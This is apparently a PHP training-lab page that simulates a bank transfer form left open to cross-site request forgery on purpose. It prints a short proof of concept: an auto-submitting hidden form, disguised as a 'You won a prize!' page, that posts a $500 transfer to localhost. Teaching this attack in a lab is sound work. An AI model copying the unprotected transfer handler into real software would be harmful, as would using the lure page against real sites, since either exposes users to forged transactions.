<?php
session_start();

// Initialize progress tracking
if (!isset($_SESSION['progress'])) {
    $_SESSION['progress'] = [
        'sqli' => 0,
        'xss' => 0,
        'csrf' => 0,
        'auth' => 0,
        'upload' => 0,
        'session' => 0
    ];
}

if (!isset($_SESSION['user'])) {
    $_SESSION['user'] = ['username' => 'demo_user', 'balance' => 1000];
}

$message = '';
$completion_message = '';

// Handle completion
if (isset($_POST['complete_lab'])) {
    $_SESSION['progress']['csrf'] = 100;
    $completion_message = "🎉 Congratulations! CSRF Lab completed!";
}

if ($_POST && isset($_POST['amount']) && !isset($_POST['complete_lab'])) {
    $amount = (int)$_POST['amount'];
    $_SESSION['user']['balance'] -= $amount;
    $message = "Transfer successful! New balance: $" . $_SESSION['user']['balance'];
    
    // Auto-complete if large transfer detected (potential CSRF)
    if ($amount >= 500) {
        $_SESSION['progress']['csrf'] = 100;
        $completion_message = "🎉 CSRF Attack detected! Lab completed!";
    }
}

$progress = $_SESSION['progress']['csrf'] ?? 0;
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CSRF Lab - ACEP CYBER LABS</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <link rel="stylesheet" href="../../assets/style.css">
    <style>
        :root {
            --neon-blue: #00BFFF;
            --neon-green: #28a745;
            --neon-yellow: #ffc107;
            --dark-bg: #0a0a0a;
            --card-bg: #181a1b;
            --text-primary: #fff;
            --text-secondary: #b0b0b0;
            --border-color: #333;

            --gradient-primary: linear-gradient(135deg, var(--neon-blue) 0%, #0099cc 100%);
        }
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, var(--dark-bg) 0%, #050505 100%);
            color: var(--text-primary);
            min-height: 100vh;
            line-height: 1.6;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }
        .header {
            text-align: center;
            padding: 40px 0;
            background: rgba(0, 0, 0, 0.4);
            border-radius: 20px;
            margin-bottom: 30px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        .lab-title {
            font-size: 2.5rem;
            font-weight: bold;
            background: var(--gradient-primary);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-bottom: 10px;
        }
        .lab-subtitle {
            font-size: 1.1rem;
            color: var(--neon-blue);
            margin-bottom: 15px;
        }
        .progress-section {
            background: var(--card-bg);
            padding: 25px;
            border-radius: 15px;
            margin-bottom: 30px;
            text-align: center;
            border: 1px solid var(--border-color);
        }
        .progress-bar {
            background: rgba(255, 255, 255, 0.1);
            border-radius: 15px;
            height: 25px;
            margin: 15px 0;
            overflow: hidden;
            position: relative;
        }
        .progress-fill {
            background: var(--gradient-primary);
            height: 100%;
            border-radius: 15px;
            transition: width 0.8s ease;
            position: relative;
        }
        .main-content {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 30px;
            margin-bottom: 30px;
        }
        .lab-section {
            background: var(--card-bg);
            padding: 30px;
            border-radius: 20px;
            border: 1px solid var(--border-color);
            backdrop-filter: blur(10px);
        }
        .section-title {
            font-size: 1.5rem;
            font-weight: bold;
            margin-bottom: 20px;
            color: var(--neon-blue);
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .account-info {
            background: rgba(255, 255, 255, 0.1);
            padding: 20px;
            border-radius: 15px;
            margin: 20px 0;
            border: 1px solid rgba(255, 255, 255, 0.2);
        }
        .account-info h3 {
            color: var(--neon-green);
            margin-bottom: 15px;
        }
        .account-info p {
            margin: 10px 0;
        }
        .account-info strong {
            color: var(--neon-blue);
        }
        .form-group {
            margin: 20px 0;
        }
        .form-label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: var(--text-secondary);
        }
        .form-input {
            width: 100%;
            padding: 15px;
            border: 2px solid rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            background: rgba(0, 0, 0, 0.3);
            color: var(--text-primary);
            font-size: 1rem;
            transition: all 0.3s ease;
        }
        .form-input:focus {
            outline: none;
            border-color: var(--neon-blue);
        }
        .btn {
            padding: 12px 25px;
            border: none;
            border-radius: 25px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            text-decoration: none;
            display: inline-block;
            text-align: center;
            font-size: 1rem;
        }
        .btn-primary {
            background: var(--gradient-primary);
            color: white;
        }
        .btn-primary:hover {
            transform: translateY(-2px);
        }
        .message {
            padding: 20px;
            margin: 20px 0;
            border-radius: 15px;
            font-weight: 600;
            background: linear-gradient(45deg, var(--neon-green), #1e90ff);
            color: white;
        }
        .completion {
            background: linear-gradient(45deg, var(--neon-yellow), #ff9500);
            color: black;
            padding: 20px;
            margin: 20px 0;
            border-radius: 15px;
            text-align: center;
            font-weight: bold;
            font-size: 1.1rem;
        }
        .hint-box {
            background: linear-gradient(45deg, var(--neon-yellow), #ff9500);
            color: black;
            padding: 20px;
            border-radius: 15px;
            margin: 20px 0;
        }
        .hint-title {
            font-weight: bold;
            margin-bottom: 15px;
            font-size: 1.1rem;
        }
        .malicious-box {
            background: linear-gradient(45deg, #ff4757, #ff3742);
            color: white;
            padding: 20px;
            border-radius: 15px;
            margin: 20px 0;
        }
        .malicious-box h4 {
            margin-bottom: 15px;
            color: var(--neon-yellow);
        }
        .code-block {
            background: rgba(0, 0, 0, 0.8);
            padding: 15px;
            border-radius: 10px;
            margin: 15px 0;
            font-family: 'Courier New', monospace;
            font-size: 0.9rem;
            overflow-x: auto;
            border: 1px solid rgba(255, 255, 255, 0.2);
        }

        
        .complete-section {
            margin-top: 20px;
            text-align: center;
        }
        
        .complete-btn {
            background: linear-gradient(45deg, var(--neon-green), #1e90ff);
            color: white;
            padding: 15px 30px;
            border: none;
            border-radius: 25px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            font-size: 1rem;
        }
        
        .complete-btn:hover {
            transform: translateY(-2px);
        }
        @media (max-width: 768px) {
            .main-content {
                grid-template-columns: 1fr;
            }
            .lab-title {
                font-size: 2rem;
            }
            .container {
                padding: 10px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="lab-title">
                <i class="fas fa-exchange-alt"></i> CSRF Lab
            </div>
            <div class="lab-subtitle">Master Cross-Site Request Forgery</div>
            <p>Practice CSRF attacks on a vulnerable banking system</p>
        </div>
        
        <div class="progress-section">
            <h3><i class="fas fa-chart-line"></i> Your Progress</h3>
            <div class="progress-bar">
                <div class="progress-fill" style="width: <?= $progress ?>%"></div>
            </div>
            <p><strong><?= $progress ?>%</strong> Complete</p>
        </div>
        
        <div class="main-content">
            <div class="lab-section">
                <div class="section-title">
                    <i class="fas fa-university"></i> Banking System
                </div>
                
                <div class="account-info">
                    <h3><i class="fas fa-user"></i> Account Information</h3>
                    <p><strong>User:</strong> <?= htmlspecialchars($_SESSION['user']['username']) ?></p>
                    <p><strong>Balance:</strong> $<?= $_SESSION['user']['balance'] ?></p>
                </div>
                
                <form method="POST">
                    <div class="form-group">
                        <label class="form-label">Transfer Amount ($):</label>
                        <input type="number" name="amount" min="1" max="1000" value="100" class="form-input">
                    </div>
                    <button type="submit" class="btn btn-primary">
                        <i class="fas fa-money-bill-wave"></i> Transfer Money
                    </button>
                </form>
                
                <?php if ($message): ?>
                    <div class="message">
                        <i class="fas fa-check-circle"></i> <?= htmlspecialchars($message) ?>
                    </div>
                <?php endif; ?>
                
                <?php if ($completion_message): ?>
                    <div class="completion">
                        <i class="fas fa-trophy"></i> <?= htmlspecialchars($completion_message) ?>
                    </div>
                <?php endif; ?>
            </div>
            
            <div class="lab-section">
                <div class="section-title">
                    <i class="fas fa-bug"></i> CSRF Attack Guide
                </div>
                
                <div class="hint-box">
                    <div class="hint-title">💡 CSRF Attack Method:</div>
                    <p>Create a malicious HTML page that automatically submits the transfer form:</p>
                    <div class="code-block">
&lt;form action="http://127.0.0.1/labs/csrf/" method="POST"&gt;
    &lt;input type="hidden" name="amount" value="500"&gt;
    &lt;input type="submit" value="Click me!"&gt;
&lt;/form&gt;
&lt;script&gt;document.forms[0].submit()&lt;/script&gt;
                    </div>
                </div>
                
                <div class="malicious-box">
                    <h4><i class="fas fa-exclamation-triangle"></i> Malicious Page Example</h4>
                    <p>Create a file called <code>malicious.html</code> with this content:</p>
                    <div class="code-block">
&lt;html&gt;
&lt;body&gt;
&lt;h1&gt;You won a prize!&lt;/h1&gt;
&lt;form action="http://127.0.0.1/labs/csrf/" method="POST"&gt;
    &lt;input type="hidden" name="amount" value="500"&gt;
    &lt;input type="submit" value="Claim Prize!"&gt;
&lt;/form&gt;
&lt;script&gt;document.forms[0].submit()&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
                    </div>
                </div>
                
                <?php if ($progress < 100): ?>
                    <div class="complete-section">
                        <form method="POST">
                            <button type="submit" name="complete_lab" class="complete-btn">
                                <i class="fas fa-check-circle"></i> Mark Lab as Complete
                            </button>
                        </form>
                    </div>
                <?php else: ?>
                    <div class="completion">
                        <i class="fas fa-star"></i> ✅ Lab Completed! You can now move to the next lab.
                    </div>
                <?php endif; ?>
            </div>
        </div>
        
        <div class="back-link">
            <a href="../../index.php">
                <i class="fas fa-arrow-left"></i> Back to Labs Dashboard
            </a>
        </div>
    </div>

</body>
</html> 